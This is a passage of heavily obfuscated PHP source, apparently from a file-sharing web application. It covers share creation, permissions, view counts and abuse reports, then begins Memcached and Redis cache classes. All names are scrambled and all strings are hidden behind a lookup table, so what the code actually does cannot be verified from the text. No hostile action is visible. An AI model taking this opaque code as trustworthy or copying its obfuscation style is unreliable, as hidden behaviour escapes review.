$ÇñÜÁ°¨; } protected function getInfoAuth($Çãİ¯Ğ™) { $É™å»Ş =& $_SERVER[•Ùç É]; $ø÷ÃÆÒÏ = $this->getInfo($Çãİ¯Ğ™); if ($ø÷ÃÆÒÏ[$É™å»Ş[1705]] == USER_ID) { $ø÷ÃÆÒÏ[$É™å»Ş[457]] = $ø÷ÃÆÒÏ[$É™å»Ş[89]][$É™å»Ş[457]]; } else { $ø÷ÃÆÒÏ[$É™å»Ş[457]] = Model($É™å»Ş[538])->authMake($ø÷ÃÆÒÏ[$É™å»Ş[2048]]); } return $ø÷ÃÆÒÏ; } protected function listData($ä¯™”› = null, $ıÏå«Á¯ = 300) { $Ç”Ÿ¿×ê =& $_SERVER[•Ùç É]; $Â·ò“• = array(array($Ç”Ÿ¿×ê[533] => array($Ç”Ÿ¿×ê[1063], 0), $Ç”Ÿ¿×ê[633] => array($Ç”Ÿ¿×ê[1063], 0), $Ç”Ÿ¿×ê[2049] => $Ç”Ÿ¿×ê[2002])); if ($ä¯™”› == $Ç”Ÿ¿×ê[2050]) { $Â·ò“• = array($Ç”Ÿ¿×ê[533] => 1); } else { if ($ä¯™”› == $Ç”Ÿ¿×ê[1212]) { $Â·ò“• = array($Ç”Ÿ¿×ê[633] => 1); } } $Â·ò“•[$Ç”Ÿ¿×ê[1705]] = USER_ID; $òÉß›†÷ = $this->where($Â·ò“•)->selectPage($ıÏå«Á¯); return $òÉß›†÷; } protected function listToMe($¹Î†Æ = 300) { $¦Œ ²›š =& $_SERVER[•Ùç É]; $ı…üşè¿ = Model($¦Œ ²›š[2051])->userGroupParents(USER_ID); $Õ¤»ø±– = array($¦Œ ²›š[618] => SourceModel::TYPE_USER, $¦Œ ²›š[540] => USER_ID); if ($ı…üşè¿) { $Õ¤»ø±– = array(array($¦Œ ²›š[618] => SourceModel::TYPE_USER, $¦Œ ²›š[540] => USER_ID), array($¦Œ ²›š[618] => SourceModel::TYPE_GROUP, $¦Œ ²›š[540] => array($¦Œ ²›š[7], $ı…üşè¿)), $¦Œ ²›š[2049] => $¦Œ ²›š[2002]); } $Õùø„ü = Model($¦Œ ²›š[636])->where($Õ¤»ø±–)->selectPage($¹Î†Æ); $íëÓÎ…¯ = array_to_keyvalue_group($Õùø„ü[$¦Œ ²›š[415]], $¦Œ ²›š[635]); if (!$íëÓÎ…¯) { return $Õùø„ü; } $óé¯Èúä = $¦Œ ²›š[2052]; $Õ¤»ø±– = array($¦Œ ²›š[635] => array($¦Œ ²›š[462], array_keys($íëÓÎ…¯)), $¦Œ ²›š[1705] => array($¦Œ ²›š[1065], $¦Œ ²›š[214])); $¤¢Øıßô = $this->field($óé¯Èúä)->where($Õ¤»ø±–)->select(); foreach ($¤¢Øıßô as $ÛªîğŠË => &$èé²ú¿Ò) { $èé²ú¿Ò[$¦Œ ²›š[2048]] = $íëÓÎ…¯[$èé²ú¿Ò[$¦Œ ²›š[635]]]; } unset($èé²ú¿Ò); $®£¾™… = array($¦Œ ²›š[2053] => $¤¢Øıßô, $¦Œ ²›š[2054] => $Õùø„ü[$¦Œ ²›š[412]]); return $®£¾™…; } protected function shareAdd($‘áãËß¹, $Ò‹¬ĞÔ) { $¶Ë´â«¿ =& $_SERVER[•Ùç É]; $¥ô‡áµê = $this->_addShareData($‘áãËß¹, $Ò‹¬ĞÔ); if (!empty($Ò‹¬ĞÔ[$¶Ë´â«¿[2055]])) { $this->_shareAuthSet($¥ô‡áµê, $Ò‹¬ĞÔ[$¶Ë´â«¿[2055]]); } $this->shareEventAdd($‘áãËß¹, $Ò‹¬ĞÔ, $¶Ë´â«¿[2056]); return $¥ô‡áµê; } protected function shareAddSystem($Ÿæ›‹¤÷, $ğŞˆ‡ä) { $¼Ü·¨Ñ =& $_SERVER[•Ùç É]; $¿´Ùä—Ë = $this->_addShareData($Ÿæ›‹¤÷, $ğŞˆ‡ä, $¼Ü·¨Ñ[181]); $this->_shareAuthSet($¿´Ùä—Ë, $ğŞˆ‡ä[$¼Ü·¨Ñ[2055]]); return $¿´Ùä—Ë; } private function shareEventAdd($Â“†©…, $«ãì¾¿š, $çÊ˜Ôá‚ = "\x61\144\144") { $…ëá¹ğÚ =& $_SERVER[•Ùç É]; if (!$Â“†©… || $Â“†©… == $…ëá¹ğÚ[214]) { return; } if ($çÊ˜Ôá‚ == $…ëá¹ğÚ[2056]) { if ($«ãì¾¿š[$…ëá¹ğÚ[533]] == $…ëá¹ğÚ[90]) { Model($…ëá¹ğÚ[603])->eventShare($Â“†©…, $…ëá¹ğÚ[2057]); } if ($«ãì¾¿š[$…ëá¹ğÚ[633]] == $…ëá¹ğÚ[90]) { Model($…ëá¹ğÚ[603])->eventShare($Â“†©…, $…ëá¹ğÚ[2058]); } return; } $µ¢¶Äºâ = $this->getInfoByPath($Â“†©…); $Û×«º±à = $…ëá¹ğÚ[2059]; if ($µ¢¶Äºâ[$…ëá¹ğÚ[533]] == $…ëá¹ğÚ[214] && $«ãì¾¿š[$…ëá¹ğÚ[533]] == $…ëá¹ğÚ[90]) { $Û×«º±à = $…ëá¹ğÚ[2057]; } if ($µ¢¶Äºâ[$…ëá¹ğÚ[533]] == $…ëá¹ğÚ[90] && $«ãì¾¿š[$…ëá¹ğÚ[533]] == $…ëá¹ğÚ[214]) { $Û×«º±à = $…ëá¹ğÚ[2060]; } if ($µ¢¶Äºâ[$…ëá¹ğÚ[633]] == $…ëá¹ğÚ[214] && $«ãì¾¿š[$…ëá¹ğÚ[633]] == $…ëá¹ğÚ[90]) { $Û×«º±à = $…ëá¹ğÚ[2058]; } if ($µ¢¶Äºâ[$…ëá¹ğÚ[633]] == $…ëá¹ğÚ[90] && $«ãì¾¿š[$…ëá¹ğÚ[633]] == $…ëá¹ğÚ[214]) { $Û×«º±à = $…ëá¹ğÚ[2061]; } Model($…ëá¹ğÚ[603])->eventShare($Â“†©…, $Û×«º±à); return; } private function _addShareData($¦›Ü»÷“, $…Ú¯İ®ä = array(), $•­½ÂĞñ = false) { $óúıŒã =& $_SERVER[•Ùç É]; $ö©¤Ô¹ = $•­½ÂĞñ == $óúıŒã[181] ? 0 : USER_ID; $‡÷ĞÜÎ¶ = array($óúıŒã[461] => $¦›Ü»÷“, $óúıŒã[1696] => $ö©¤Ô¹); if ($¦›Ü»÷“ == 0) { $‡÷ĞÜÎ¶ = array($óúıŒã[2062] => $…Ú¯İ®ä[$óúıŒã[1226]], $óúıŒã[1696] => $ö©¤Ô¹); } if ($Ö‹î¨è¸ = $this->where($‡÷ĞÜÎ¶)->find()) { return $Ö‹î¨è¸[$óúıŒã[635]]; } if ($¦›Ü»÷“ == 0) { $ˆ¤ŒøÊ = array($óúıŒã[32] => get_path_this($…Ú¯İ®ä[$óúıŒã[86]])); } else { $ˆ¤ŒøÊ = Model($óúıŒã[870])->sourceInfo($¦›Ü»÷“); if (!$ˆ¤ŒøÊ) { return !1; } } if (!$…Ú¯İ®ä[$óúıŒã[1593]]) { $…Ú¯İ®ä[$óúıŒã[1593]] = $ˆ¤ŒøÊ[$óúıŒã[32]]; } $ãœ¼§® = array($óúıŒã[1696] => $ö©¤Ô¹, $óúıŒã[461] => $¦›Ü»÷“, $óúıŒã[1593] => $óúıŒã[12], $óúıŒã[533] => 0, $óúıŒã[633] => 0, $óúıŒã[1226] => $óúıŒã[12], $óúıŒã[353] => $óúıŒã[12], $óúıŒã[940] => $óúıŒã[12], $óúıŒã[2063] => 0, $óúıŒã[2064] => 0, $óúıŒã[806] => 0, $óúıŒã[2065] => $óúıŒã[12], $óúıŒã[2046] => $óúıŒã[12]); $üÉÂ¤Äñ = explode($óúıŒã[50], $óúıŒã[2066]); foreach ($üÉÂ¤Äñ as $¬Å¶—´‰) { if (!isset($…Ú¯İ®ä[$¬Å¶—´‰])) { continue; } $ãœ¼§®[$¬Å¶—´‰] = $…Ú¯İ®ä[$¬Å¶—´‰]; } $Œûê¯ãş = $this->add($ãœ¼§®); $­…Áóğ = array($óúıŒã[2046] => short_id($Œûê¯ãş)); $this->where(array($óúıŒã[2067] => $Œûê¯ãş))->save($­…Áóğ); return $Œûê¯ãş; } private function _shareAuthSet($ôÙ‡Ÿ¾¤, $ùÁ¥ãÆ‘) { $¸½£ÜÕÆ =& $_SERVER[•Ùç É]; if (!is_array($ùÁ¥ãÆ‘)) { return !1; } $óŒšº¦î = Model($¸½£ÜÕÆ[2012]); $óŒšº¦î->where(array($¸½£ÜÕÆ[635] => $ôÙ‡Ÿ¾¤))->delete(); $–Èá…ú = array(); foreach ($ùÁ¥ãÆ‘ as $¹Œ°õÏ ) { $£¸‚Ñƒü = SourceModel::TYPE_USER; if ($¹Œ°õÏ [$¸½£ÜÕÆ[180]] == SourceModel::TYPE_GROUP) { $£¸‚Ñƒü = SourceModel::TYPE_GROUP; } $Øâ­Ûºâ = array($¸½£ÜÕÆ[635] => $ôÙ‡Ÿ¾¤, $¸½£ÜÕÆ[180] => $£¸‚Ñƒü, $¸½£ÜÕÆ[540] => intval($¹Œ°õÏ [$¸½£ÜÕÆ[540]]), $¸½£ÜÕÆ[2008] => 0, $¸½£ÜÕÆ[2068] => -1); if ($¹Œ°õÏ [$¸½£ÜÕÆ[2008]]) { $Øâ­Ûºâ[$¸½£ÜÕÆ[2008]] = $¹Œ°õÏ [$¸½£ÜÕÆ[2008]]; } else { if ($¹Œ°õÏ [$¸½£ÜÕÆ[2068]]) { $Øâ­Ûºâ[$¸½£ÜÕÆ[2068]] = $¹Œ°õÏ [$¸½£ÜÕÆ[2068]]; } } $–Èá…ú[] = $Øâ­Ûºâ; } return $óŒšº¦î->addAll($–Èá…ú, array(), !0); } public function numViewAdd($±«Ÿ¼¿Ÿ) { $“¡ÊÑ™µ =& $_SERVER[•Ùç É]; $ÎğŠË£´ = array($“¡ÊÑ™µ[2067] => $±«Ÿ¼¿Ÿ); $this->where($ÎğŠË£´)->setAdd($“¡ÊÑ™µ[2063]); } public function numDownloadAdd($ÕšÖ‚úĞ) { $½Ì¿µ·¢ =& $_SERVER[•Ùç É]; $¯á‹Åµ× = array($½Ì¿µ·¢[2067] => $ÕšÖ‚úĞ); $this->where($¯á‹Åµ×)->setAdd($½Ì¿µ·¢[2064]); } protected function shareEdit($–÷œÔ¶Ë, $ãÛƒ‡—½) { $ßÍ¥´ƒ =& $_SERVER[•Ùç É]; $¨›ä”¶— = $this->getInfo($–÷œÔ¶Ë); if (!$¨›ä”¶—) { return !1; } $this->_checkLinkShare($ãÛƒ‡—½, $¨›ä”¶—); $ˆİĞş¸¨ = array(); $ÕõéÚ¢’ = explode($ßÍ¥´ƒ[50], $ßÍ¥´ƒ[2069]); foreach ($ÕõéÚ¢’ as $Ö¦ã¡³Ë) { if (!array_key_exists($Ö¦ã¡³Ë, $ãÛƒ‡—½)) { continue; } $ˆİĞş¸¨[$Ö¦ã¡³Ë] = $ãÛƒ‡—½[$Ö¦ã¡³Ë]; } $this->shareEventAdd($¨›ä”¶—[$ßÍ¥´ƒ[183]], $ãÛƒ‡—½, $ßÍ¥´ƒ[1874]); $this->where(array($ßÍ¥´ƒ[2067] => $–÷œÔ¶Ë))->save($ˆİĞş¸¨); if (isset($ãÛƒ‡—½[$ßÍ¥´ƒ[2055]])) { $this->_shareAuthSet($–÷œÔ¶Ë, $ãÛƒ‡—½[$ßÍ¥´ƒ[2055]]); } return !0; } private function _checkLinkShare($œö¬€¸à, $Õ˜ĞŞ°ê) { $ÖÃ†ñ¿Â =& $_SERVER[•Ùç É]; if ($œö¬€¸à[$ÖÃ†ñ¿Â[533]] != $ÖÃ†ñ¿Â[90]) { return; } $ùÈ“ş›¯ = $Õ˜ĞŞ°ê[$ÖÃ†ñ¿Â[89]][$ÖÃ†ñ¿Â[183]]; if ($Õ˜ĞŞ°ê[$ÖÃ†ñ¿Â[89]][$ÖÃ†ñ¿Â[33]] != $ÖÃ†ñ¿Â[216]) { $‡Ô˜¥Ÿá = $this->_folderReport($ùÈ“ş›¯); if (!$‡Ô˜¥Ÿá) { return; } show_json(LNG($ÖÃ†ñ¿Â[2070]) . $ÖÃ†ñ¿Â[2071] . $‡Ô˜¥Ÿá, !1); } $è›À…éã = Model($ÖÃ†ñ¿Â[870])->fileInfoGet($Õ˜ĞŞ°ê[$ÖÃ†ñ¿Â[89]][$ÖÃ†ñ¿Â[183]]); if (!$è›À…éã) { return; } $•é ÷éç = $this->shareFileMeta($è›À…éã[$ÖÃ†ñ¿Â[511]]); if (isset($•é ÷éç[$ÖÃ†ñ¿Â[420]]) && $•é ÷éç[$ÖÃ†ñ¿Â[420]] == $ÖÃ†ñ¿Â[90]) { show_json(LNG($ÖÃ†ñ¿Â[2072]), !1); } } private function _folderReport($¶Üğ›€¥) { $“şïÚ¨ì =& $_SERVER[•Ùç É]; $äíˆ±õ¨ = array($“şïÚ¨ì[511] => array($“şïÚ¨ì[1063], 0), $“şïÚ¨ì[795] => 3); $™¦Ğ¹ú— = Model($“şïÚ¨ì[2073])->where($äíˆ±õ¨)->field($“şïÚ¨ì[511])->select(); if (!$™¦Ğ¹ú—) { return !1; } $™¦Ğ¹ú— = array_to_keyvalue($™¦Ğ¹ú—, $“şïÚ¨ì[12], $“şïÚ¨ì[511]); $ş‹†Ó… = $“şïÚ¨ì[50] . $¶Üğ›€¥ . $“şïÚ¨ì[50]; $äíˆ±õ¨ = array($“şïÚ¨ì[511] => array($“şïÚ¨ì[7], $™¦Ğ¹ú—), $“şïÚ¨ì[555] => array($“şïÚ¨ì[429], "\x25{$ş‹†Ó…}\45"), $“şïÚ¨ì[475] => 0); $Æò¨Ìäİ = Model($“şïÚ¨ì[870])->where($äíˆ±õ¨)->field($“şïÚ¨ì[2074])->find(); if (!$Æò¨Ìäİ) { return !1; } $„ùéÚ×ğ = substr($Æò¨Ìäİ[$“şïÚ¨ì[555]], strpos($Æò¨Ìäİ[$“şïÚ¨ì[555]], $ş‹†Ó…)); $äíˆ±õ¨ = array($“şïÚ¨ì[183] => array($“şïÚ¨ì[7], trim($„ùéÚ×ğ, $“şïÚ¨ì[50]))); $Ñ‘«œÇ = Model($“şïÚ¨ì[870])->where($äíˆ±õ¨)->field($“şïÚ¨ì[32])->select(); $·ëìÙ¾Ò = array_to_keyvalue($Ñ‘«œÇ, $“şïÚ¨ì[12], $“şïÚ¨ì[32]); $·ëìÙ¾Ò[] = $Æò¨Ìäİ[$“şïÚ¨ì[32]]; return implode($“şïÚ¨ì[8], $·ëìÙ¾Ò); } protected function remove($â€ûÄè) { $öºì“·Ğ =& $_SERVER[•Ùç É]; if (is_array($â€ûÄè)) { $â€ûÄè = array($öºì“·Ğ[7], $â€ûÄè); } $Æìşõâ = array($öºì“·Ğ[635] => $â€ûÄè); $àĞ—·Õ¹ = $this->where($Æìşõâ)->delete(); if ($àĞ—·Õ¹) { Model($öºì“·Ğ[636])->where(array($öºì“·Ğ[635] => $â€ûÄè))->delete(); } $Ë«üş×¥ = is_array($â€ûÄè) ? $â€ûÄè[1] : array($â€ûÄè); for ($İ¤ç´† = 0; $İ¤ç´† < count($Ë«üş×¥); $İ¤ç´†++) { $¸·§èÃ‘ = $this->getInfo($Ë«üş×¥[$İ¤ç´†]); if ($¸·§èÃ‘[$öºì“·Ğ[633]] == $öºì“·Ğ[90]) { Model($öºì“·Ğ[603])->eventShare($¸·§èÃ‘[$öºì“·Ğ[183]], $öºì“·Ğ[2061]); } if ($¸·§èÃ‘[$öºì“·Ğ[533]] == $öºì“·Ğ[90]) { Model($öºì“·Ğ[603])->eventShare($¸·§èÃ‘[$öºì“·Ğ[183]], $öºì“·Ğ[2060]); } } return $àĞ—·Õ¹; } protected function removeBySource($¾–ßÆ•ß) { $üˆ‘— =& $_SERVER[•Ùç É]; $Í«ı¤„² = array($üˆ‘—[461] => array($üˆ‘—[462], $¾–ßÆ•ß)); $°ÃƒÙ„î = $this->field($üˆ‘—[635])->where($Í«ı¤„²)->select(); $°ÃƒÙ„î = array_to_keyvalue($°ÃƒÙ„î, $üˆ‘—[12], $üˆ‘—[635]); if (!$°ÃƒÙ„î) { return; } $Í«ı¤„² = array($üˆ‘—[2067] => array($üˆ‘—[462], $°ÃƒÙ„î)); $this->where($Í«ı¤„²)->delete(); Model($üˆ‘—[636])->where($Í«ı¤„²)->delete(); } public function listAll($ÊŸ¬œş) { $ó®º‰¸ =& $_SERVER[•Ùç É]; $ÑÂ½Ã’€ = array(); if ($ÊŸ¬œş[$ó®º‰¸[1705]]) { $ÑÂ½Ã’€[$ó®º‰¸[1705]] = $ÊŸ¬œş[$ó®º‰¸[1705]]; } if ($ÊŸ¬œş[$ó®º‰¸[805]]) { $ì—î®ùÀ = $ÊŸ¬œş[$ó®º‰¸[806]] ? $ÊŸ¬œş[$ó®º‰¸[806]] : strtotime(date($ó®º‰¸[2075])); $ÑÂ½Ã’€[$ó®º‰¸[217]] = array($ó®º‰¸[379], array($ÊŸ¬œş[$ó®º‰¸[805]], $ì—î®ùÀ)); } if ($ÊŸ¬œş[$ó®º‰¸[33]]) { $ÑÂ½Ã’€[$ÊŸ¬œş[$ó®º‰¸[33]]] = 1; } else { $ÑÂ½Ã’€[] = array($ó®º‰¸[533] => array($ó®º‰¸[1063], 0), $ó®º‰¸[633] => array($ó®º‰¸[1063], 0), $ó®º‰¸[2049] => $ó®º‰¸[2002]); } if ($ÊŸ¬œş[$ó®º‰¸[1998]]) { $ÑÂ½Ã’€[] = array($ó®º‰¸[2046] => $ÊŸ¬œş[$ó®º‰¸[1998]], $ó®º‰¸[1593] => array($ó®º‰¸[429], "\x25{$ÊŸ¬œş[$ó®º‰¸[1998]]}\45"), $ó®º‰¸[2049] => $ó®º‰¸[2002]); } $Æª‚Â×œ = $this->_makeOrder()->where($ÑÂ½Ã’€)->selectPage(20); if (empty($Æª‚Â×œ[$ó®º‰¸[415]])) { return array(); } $this->_listDataApply($Æª‚Â×œ[$ó®º‰¸[415]]); return $Æª‚Â×œ; } public function listDataApply($½ñÆÖÈ¹) { $this->_listDataApply($½ñÆÖÈ¹); return $½ñÆÖÈ¹; } private function _listDataApply(&$ƒ—¥Ô¬Ã) { $šÌ õ•Ğ =& $_SERVER[•Ùç É]; $ä¡É¸¶ú = array_to_keyvalue($ƒ—¥Ô¬Ã, $šÌ õ•Ğ[12], $šÌ õ•Ğ[1705]); $§æ‰Ãšæ = Model($šÌ õ•Ğ[569])->userListInfo(array_unique($ä¡É¸¶ú)); $¯äÔÛ¸² = array_to_keyvalue($ƒ—¥Ô¬Ã, $šÌ õ•Ğ[12], $šÌ õ•Ğ[183]); $Ãö…×ˆ = Model($šÌ õ•Ğ[870])->sourceListInfo($¯äÔÛ¸², !0); foreach ($ƒ—¥Ô¬Ã as $¶õéŞŸÌ => &$ŠóëÁÏ·) { $òÆ®Ê°î = $ŠóëÁÏ·[$šÌ õ•Ğ[1705]]; $ŠóëÁÏ·[$šÌ õ•Ğ[2076]] = $§æ‰Ãšæ[$òÆ®Ê°î] ? $§æ‰Ãšæ[$òÆ®Ê°î] : !1; $·êˆ‹ò = $ŠóëÁÏ·[$šÌ õ•Ğ[183]]; $ŠóëÁÏ·[$šÌ õ•Ğ[89]] = $Ãö…×ˆ[$·êˆ‹ò] ? $Ãö…×ˆ[$·êˆ‹ò] : !1; if ($ŠóëÁÏ·[$šÌ õ•Ğ[89]][$šÌ õ•Ğ[475]] == $šÌ õ•Ğ[90]) { unset($ƒ—¥Ô¬Ã[$¶õéŞŸÌ]); } if ($ŠóëÁÏ·[$šÌ õ•Ğ[89]] != $šÌ õ•Ğ[214] && !$ŠóëÁÏ·[$šÌ õ•Ğ[89]]) { unset($ƒ—¥Ô¬Ã[$¶õéŞŸÌ]); } } unset($ŠóëÁÏ·); $ƒ—¥Ô¬Ã = array_values($ƒ—¥Ô¬Ã); } private function _makeOrder($‡úÈÙ³¤ = '') { $ªÒ•Ææ¼ =& $_SERVER[•Ùç É]; $²Ó—¢ò» = array($ªÒ•Ææ¼[217], $ªÒ•Ææ¼[806], $ªÒ•Ææ¼[2063], $ªÒ•Ææ¼[2064]); $Êş–¢§İ = array($ªÒ•Ææ¼[493] => $ªÒ•Ææ¼[494], $ªÒ•Ææ¼[495] => $ªÒ•Ææ¼[496]); $»à­Ô“Ä = Input::get($ªÒ•Ææ¼[500], $ªÒ•Ææ¼[7], $ªÒ•Ææ¼[467], $²Ó—¢ò»); $ÒÌæ™µ = Input::get($ªÒ•Ææ¼[501], $ªÒ•Ææ¼[7], $ªÒ•Ææ¼[2077], array($ªÒ•Ææ¼[1995], $ªÒ•Ææ¼[495])); $ÒÌæ™µ = $Êş–¢§İ[$ÒÌæ™µ]; $‡úÈÙ³¤ = $‡úÈÙ³¤ . "{$»à­Ô“Ä}\x20{$ÒÌæ™µ}"; return $this->order($‡úÈÙ³¤); } public function reportAdd($î®î½ÅÏ) { $Ìû±ğÂ© =& $_SERVER[•Ùç É]; $ÈğúÃË† = array($Ìû±ğÂ©[635] => $î®î½ÅÏ[$Ìû±ğÂ©[635]], $Ìû±ğÂ©[1705] => USER_ID); if (Model($Ìû±ğÂ©[2073])->where($ÈğúÃË†)->find()) { return !1; } $ëÃ‚šÆ = array($Ìû±ğÂ©[635] => $î®î½ÅÏ[$Ìû±ğÂ©[635]], $Ìû±ğÂ©[1593] => $î®î½ÅÏ[$Ìû±ğÂ©[1593]], $Ìû±ğÂ©[183] => $î®î½ÅÏ[$Ìû±ğÂ©[183]], $Ìû±ğÂ©[511] => $î®î½ÅÏ[$Ìû±ğÂ©[511]], $Ìû±ğÂ©[1705] => USER_ID, $Ìû±ğÂ©[33] => $î®î½ÅÏ[$Ìû±ğÂ©[33]], $Ìû±ğÂ©[496] => $î®î½ÅÏ[$Ìû±ğÂ©[496]]); return Model($Ìû±ğÂ©[2073])->add($ëÃ‚šÆ); } public function reportList($Âø¸‡ªÏ) { $›‚¤üó =& $_SERVER[•Ùç É]; $•ÖÒ±Ã“ = array(); if ($Âø¸‡ªÏ[$›‚¤üó[805]]) { $ôàª™çü = $Âø¸‡ªÏ[$›‚¤üó[806]] ? $Âø¸‡ªÏ[$›‚¤üó[806]] : strtotime(date($›‚¤üó[2075])); $•ÖÒ±Ã“[$›‚¤üó[217]] = array($›‚¤üó[379], array($Âø¸‡ªÏ[$›‚¤üó[805]], $ôàª™çü)); } if (isset($Âø¸‡ªÏ[$›‚¤üó[33]]) && in_array($Âø¸‡ªÏ[$›‚¤üó[33]], array($›‚¤üó[90], $›‚¤üó[480], $›‚¤üó[2078], $›‚¤üó[2079], $›‚¤üó[2080]))) { $•ÖÒ±Ã“[$›‚¤üó[33]] = $Âø¸‡ªÏ[$›‚¤üó[33]]; } if (isset($Âø¸‡ªÏ[$›‚¤üó[795]]) && in_array($Âø¸‡ªÏ[$›‚¤üó[795]], array($›‚¤üó[214], $›‚¤üó[90], $›‚¤üó[480], $›‚¤üó[2078]))) { $•ÖÒ±Ã“[$›‚¤üó[795]] = $Âø¸‡ªÏ[$›‚¤üó[795]]; } $ß€×Á‹ğ = Input::get($›‚¤üó[501], $›‚¤üó[7], $›‚¤üó[2077], array($›‚¤üó[1995], $›‚¤üó[495])); $î°¦åıß = array($›‚¤üó[493] => $›‚¤üó[494], $›‚¤üó[495] => $›‚¤üó[496]); $ÎŸ‡ä• = $›‚¤üó[2081] . $î°¦åıß[$ß€×Á‹ğ]; $ûÑÕû· = Model($›‚¤üó[2073])->where($•ÖÒ±Ã“)->order($ÎŸ‡ä•)->selectPage(20); if (empty($ûÑÕû·[$›‚¤üó[415]])) { return array(); } $ïÒÌŠ’ò = array_to_keyvalue_group($ûÑÕû·[$›‚¤üó[415]], $›‚¤üó[795], $›‚¤üó[635]); if (!empty($ïÒÌŠ’ò[0])) { $Âø¸‡ªÏ = $ïÒÌŠ’ò[0]; $•ÖÒ±Ã“ = array($›‚¤üó[635] => array($›‚¤üó[7], $Âø¸‡ªÏ)); $¥’ùÁß = $this->where($•ÖÒ±Ã“)->field($›‚¤üó[635])->select(); $¥’ùÁß = array_to_keyvalue($¥’ùÁß, $›‚¤üó[12], $›‚¤üó[635]); $¤’İĞØå = array_diff($Âø¸‡ªÏ, $¥’ùÁß); if (!empty($¤’İĞØå)) { foreach ($ûÑÕû·[$›‚¤üó[415]] as $ÓÏ“–á§ => $ÈáÉ¯Í) { if (in_array($ÈáÉ¯Í[$›‚¤üó[635]], $¤’İĞØå)) { unset($ûÑÕû·[$›‚¤üó[415]][$ÓÏ“–á§]); } } } } $this->_listDataApply($ûÑÕû·[$›‚¤üó[415]]); return $ûÑÕû·; } public function reportStatus($üİ²Ø‡ˆ) { $İó¤¤ï— =& $_SERVER[•Ùç É]; $Úè¾±ª» = array($İó¤¤ï—[445] => $üİ²Ø‡ˆ[$İó¤¤ï—[445]]); $î¯ßëÚŒ = Model($İó¤¤ï—[2073])->where($Úè¾±ª»)->field($İó¤¤ï—[2082])->find(); if (!$î¯ßëÚŒ) { return !1; } $ÂÊ«ì†„ = array($İó¤¤ï—[795] => $üİ²Ø‡ˆ[$İó¤¤ï—[795]]); if ($üİ²Ø‡ˆ[$İó¤¤ï—[795]] == $İó¤¤ï—[2078] && $î¯ßëÚŒ[$İó¤¤ï—[795]] == $İó¤¤ï—[2078]) { $ÂÊ«ì†„[$İó¤¤ï—[795]] = 0; } $º‡¬Ã¡÷ = Model($İó¤¤ï—[2073])->where($Úè¾±ª»)->save($ÂÊ«ì†„); if ($üİ²Ø‡ˆ[$İó¤¤ï—[795]] == $İó¤¤ï—[480]) { if ($î¯ßëÚŒ[$İó¤¤ï—[511]] != $İó¤¤ï—[214] && $this->shareFileMeta($î¯ßëÚŒ[$İó¤¤ï—[511]])) { $this->shareFileMeta($î¯ßëÚŒ[$İó¤¤ï—[511]], 0); } $this->remove($î¯ßëÚŒ[$İó¤¤ï—[635]]); return !0; } if ($º‡¬Ã¡÷ && $üİ²Ø‡ˆ[$İó¤¤ï—[795]] == $İó¤¤ï—[2078]) { $µìş«ş = $ÂÊ«ì†„[$İó¤¤ï—[795]] == $İó¤¤ï—[2078] ? 1 : 0; $this->shareFileMeta($î¯ßëÚŒ[$İó¤¤ï—[511]], $µìş«ş); $this->removeByFile($î¯ßëÚŒ[$İó¤¤ï—[511]]); } return $º‡¬Ã¡÷; } private function removeByFile($øúŒ…„) { $Æ§ˆş”Ì =& $_SERVER[•Ùç É]; $Ó˜‰€¿ä = Model($Æ§ˆş”Ì[870])->where(array($Æ§ˆş”Ì[511] => $øúŒ…„))->field($Æ§ˆş”Ì[183])->select(); $Ù•¯—«ƒ = array_to_keyvalue($Ó˜‰€¿ä, $Æ§ˆş”Ì[12], $Æ§ˆş”Ì[183]); $ÒäŞ¢™ß = array($Æ§ˆş”Ì[183] => array($Æ§ˆş”Ì[7], $Ù•¯—«ƒ), $Æ§ˆş”Ì[533] => 1); $Ó˜‰€¿ä = $this->where($ÒäŞ¢™ß)->field($Æ§ˆş”Ì[635])->select(); if (empty($Ó˜‰€¿ä)) { return; } $ä¸•ò­İ = array_to_keyvalue($Ó˜‰€¿ä, $Æ§ˆş”Ì[12], $Æ§ˆş”Ì[635]); $this->remove($ä¸•ò­İ); } private function shareFileMeta($‹˜¾‡îÑ, $úÅ°êê˜ = null) { $şğ¬š¿ =& $_SERVER[•Ùç É]; $¾ÁÌÍã± = array($şğ¬š¿[511] => $‹˜¾‡îÑ, $şğ¬š¿[96] => $şğ¬š¿[2083]); if (is_null($úÅ°êê˜)) { return Model($şğ¬š¿[2084])->where($¾ÁÌÍã±)->find(); } $¾ÁÌÍã±[$şğ¬š¿[420]] = $úÅ°êê˜; Model($şğ¬š¿[2084])->add($¾ÁÌÍã±, array(), !0); } } goto dî‰‡ìô¤É; aæáíÀÆÌŸ: class CacheMemcached { public $handle; public $cacheTime; public function __construct($ÕœçËš¶, $æí¸²­) { $üä’İ´¾ =& $_SERVER[•Ùç É]; if (!class_exists($üä’İ´¾[912])) { show_json($üä’İ´¾[913], !1); } $this->cacheTime = $æí¸²­; $this->handle = new Memcached(); if (is_array($ÕœçËš¶[$üä’İ´¾[914]]) && count($ÕœçËš¶[$üä’İ´¾[914]]) >= 1) { foreach ($ÕœçËš¶[$üä’İ´¾[914]] as $¸»ù…Ûğ) { $•‰£úåÉ = explode($üä’İ´¾[4], $¸»ù…Ûğ); $this->handle->addServer($•‰£úåÉ[0], $•‰£úåÉ[1]); } } else { $this->handle->addServer($ÕœçËš¶[$üä’İ´¾[198]], $ÕœçËš¶[$üä’İ´¾[199]]); } } public function set($˜¶ëÒ³, $¬¹œé›, $£š®ŞŒ² = false) { $£š®ŞŒ² = $£š®ŞŒ² ? $£š®ŞŒ² : $this->cacheTime; return $this->handle->set($˜¶ëÒ³, $¬¹œé›, $£š®ŞŒ²); } public function get($ë¹ù­Ïñ) { return $this->handle->get($ë¹ù­Ïñ); } public function remove($÷ç¬ØÉ´) { return $this->handle->delete($÷ç¬ØÉ´); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ÆäËÖ©£, $é£Ö“Š) { $ªèßÈÍ =& $_SERVER[•Ùç É]; if (!class_exists($ªèßÈÍ[915])) { show_json($ªèßÈÍ[916], !1); } $this->cacheTime = $é£Ö“Š; $“şáœ¸“ = isset($ÆäËÖ©£[$ªèßÈÍ[917]]) ? $ÆäËÖ©£[$ªèßÈÍ[917]] : 10; $ìÁĞ¼Ê¤ = _get($ÆäËÖ©£, $ªèßÈÍ[914]); if ($ìÁĞ¼Ê¤ && is_array($ìÁĞ¼Ê¤)) { $this->initCluster($ÆäËÖ©£, $“şáœ¸“); } else { $this->handle = $this->init($ÆäËÖ©£, $“şáœ¸“); } } private function init($§á¹œ³•, $–„Ó¯ºÖ) { 